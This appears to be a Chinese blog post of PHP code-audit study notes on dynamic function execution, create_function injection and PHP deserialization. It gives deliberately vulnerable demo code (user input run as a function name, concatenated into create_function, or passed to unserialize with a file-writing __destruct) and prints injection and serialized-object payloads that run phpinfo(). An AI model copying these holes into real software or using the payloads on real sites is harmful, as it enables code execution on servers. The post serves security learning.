      <a  href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/" class="article-date">
      <time datetime="2021-10-25T04:37:09.000Z" itemprop="datePublished">2021-10-25</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">PHP代码审计学习-3</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
<p>测试demo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$args1</span>(<span class="variable">$args2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">c(<span class="variable">$action</span>,<span class="variable">$cmd</span>);</span><br><span class="line"><span class="comment">//浏览器获取到的值 b ，现在作为 c() 函数的参数插入到了函数中，并且在函数中作为函数名调用了另外一个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025160512247.png" alt="image-20211025160512247"></p>
<p>利用<code>$action</code>、<code>$cmd</code> 动态传递参数，执行命令</p>
<h4 id="匿名函数-Anonymous-functions"><a href="#匿名函数-Anonymous-functions" class="headerlink" title="匿名函数(Anonymous functions)"></a>匿名函数(Anonymous functions)</h4><p>也被称之为闭包函数(closures)，允许临时创建一个没有指定名称的函数。最经常用作回调函数(callback)参数的值</p>
<p>测试demo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>]; <span class="comment">//GET方式传入值</span></span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>; <span class="comment">//strnatcasecmp 用于 比较字符串大小</span></span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>; <span class="comment">//return 1*(0/1)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;this is test&#x27;</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>)); <span class="comment">//此处创建一个匿名函数 $a $b作为参数传给$sort_function</span></span><br><span class="line"><span class="comment">//// 匿名函数相当于隐式函数大概内内部是如此，我们可以将传参的$sort_by 做一些处理，比如说闭合，使其能拼接执行恶意代码</span></span><br><span class="line"><span class="comment">//function xxx($a,$b)&#123;</span></span><br><span class="line"><span class="comment">//    return 1*strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();/*,$b[&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo &#x27;nayon&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>匿名函数create_function()在其中创建的函数大概为如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function xxx($a,$b)&#123;</span><br><span class="line">    return 1*strnatcasecmp($a[&quot;1&quot;],$b[&#x27;2&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;nayon&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用<code>&#125;</code>闭合匿名函数，继续写上恶意代码，然后再/*注释掉垃圾字符。</p>
<p>由此我们可以拼接出利用payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort_by=<span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025163501429.png" alt="image-20211025163501429"></p>
<p>测试demo：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span>=create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&quot;return (strlen(<span class="subst">$a</span>)-strlen(<span class="subst">$b</span>)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>,<span class="string">&#x27;this&#x27;</span>,<span class="string">&#x27;midding lenth&#x27;</span>,<span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line">usort(<span class="variable">$array</span>,<span class="variable">$lambda</span>);</span><br><span class="line">print_r(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$c</code>处未存在过滤,可构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:3));&#125;phpinfo();/* #/用于注释多出的));以及匿名函数所会生成的&#125;</span><br><span class="line">payload2:3));&#125;phpinfo();&#123;((1 #利用&#123; 和((将多出的字符闭合</span><br></pre></td></tr></table></figure>

<p>匿名函数中大概这样，进行执行phpinfo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+strlen(<span class="number">1</span>));&#125;</span><br><span class="line">phpinfo();&#123;</span><br><span class="line">    ((<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025164600761.png" alt="image-20211025164600761"></p>
<h3 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<code>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保存函数方法</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php序列化的函数为serialize 可以将对象中的成员变量转换成字符串。</span><br><span class="line">php反序列化的函数为unserialize  可以将序列化生成的字符串重新还原为对象中的成员变量。</span><br></pre></td></tr></table></figure>

<p><code>将用户可控的数据进行反序列化</code> 就是所谓的php反序列化漏洞</p>
<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><p>序列化的目的是方便数据的传输与储存。</p>
<p>php应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie缓存等。</p>
<p>常见的序列化格式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制格式</span><br><span class="line">字节数组</span><br><span class="line">json字符串</span><br><span class="line">xml字符串</span><br></pre></td></tr></table></figure>

<p>序列化测试demo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;This is B&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(serialize(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure>

<p>输出值:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\phplearn\global.php:<span class="number">11</span>:string &#x27;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;&#x27; (length=<span class="number">96</span>)</span><br></pre></td></tr></table></figure>

<p>实际上的序列化字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>序列化字符串结构</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:对象名的长度:<span class="string">&quot;对象名&quot;</span>:对象属性个数:&#123;s[属性的类型，字符串s 整型i....]:属性名的长度:<span class="string">&quot;属性名&quot;</span>;s:属性值的长度:<span class="string">&quot;属性值&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来，序列化后，共有3个属性在序列化字符串中，函数方法test1未能进行序列化</p>
<p>序列化后的结果是字符串string</p>
<p>test是一个类，new test()代表创建test类的对象</p>
<p>O表示对象，4表示类名共有4个字符长 ，test是类的名称</p>
<p>3是序列化对象中共有三个成员变量。括号內部依序是<code>类型、名称、值</code>,同时变量与变量之间由分号隔开</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025174739757.png" alt="image-20211025174739757"></p>
<p>在这其中，a是public类型变量、s表示字符串、1表示变量名长度，a是变量名。</p>
<p>b是protected类型的变量，它的变量名长度为4，也就是在名字前加上了%00*%00变为了<code>%00*%00b</code> ,所以我们可以得知protected属性的表示方法是在变量名前加上<code>%00*%00</code></p>
<p>c是private类型的变量，c的变量名前加上类%00类名%00变量名 即<code>%00类%00c</code>表名此是私有变量</p>
<p>虽说在test类中存在test1方法，但php序列化中，并不会保存方法。</p>
<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(<span class="variable">$e</span> = serialize(<span class="variable">$test</span>)); <span class="comment">//打印输出序列化字符串</span></span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="variable">$e</span>)); <span class="comment">//反序列化字符串</span></span><br></pre></td></tr></table></figure>

<p>打印输出:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is A&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="string">&quot;c&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is C&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，类的成员变量被还原，它们是否公有、私有、保护的类型也得到正确的表示。</p>
<h5 id="在php中所能用到的魔术方法"><a href="#在php中所能用到的魔术方法" class="headerlink" title="在php中所能用到的魔术方法"></a>在php中所能用到的魔术方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php类可能会包含魔术方法，魔术方法命名都是以`__`开始，例如 `__construct`，`__destruct`,`__toString`,`__sleep`,`__wakeup`，魔法函数在某些情况下会自动调用</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct(): 有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line">__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">__toString():一个类被当成字符串时应该如何回应，例如echo $obj打印类时，若存在__toString魔法函数，将会自动调用.</span><br><span class="line">__sleep(): 在一个对象被序列化之前调用</span><br><span class="line">__wakeup():unserialize()会检查是否存在一个_wakeup()方法。如果存在，则会首先调用__wakeup方法，为对象进行处理。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() #当对象被创建时调用</span><br><span class="line">__destruct() #当对象被销毁时调用</span><br><span class="line">__toString() #当对象被当做字符串时使用</span><br><span class="line">__sleep() #在对象被序列化之前调用</span><br><span class="line">__wakeup() #在对象unserialize()之前进行调用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;str&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类被实现时，php首先检测类中是否存在__construct方法，存在先执行其魔术方法再实现</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;new了一个对象，对象被创建，执行__construct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之前检查类中是否存在__sleep()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;serialize了一个对象，对象被序列化，先执行__sleep，再序列化&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sTest</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//__wakeup()在反序列化之间执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$usTest</span> = unserialize(<span class="variable">$sTest</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象被当做字符串使用时，__toString方法被触发，执行其中内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;把Test对象当做字符串使用，执行__toString&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;use Test obj as str &#x27;</span>.<span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//程序执行完毕，对象销毁释放，执行__destruct方法.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;程序执行完毕，对象自动销毁，执行__destruct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025195535420.png" alt="image-20211025195535420"></p>
<h5 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h5><p>攻击者可以操纵unserialize的参数，以构造恶意的序列化字符串，当应用程序将恶意字符串反序列化为对象后，恶意代码得以执行，这就造成了php反序列化漏洞。</p>
<p>demo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&#x27;wakeup!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct complate&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用echo ，拿到序列化后的恶意字符串，通过test传参进入</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">?test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201208619.png" alt="image-20211025201208619"></p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201203470.png" alt="image-20211025201203470"></p>
<h4 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h4><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>构造序列化字符串时，可以根据要进行序列化操作的类中的成员变量，写一份简易序列化函数，用于调试payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$target</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<p>运行拿到序列化字符串:</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210307399.png" alt="image-20211025210307399"></p>
<p>由于成员变量为protected模式，由此可知乱码为:</p>
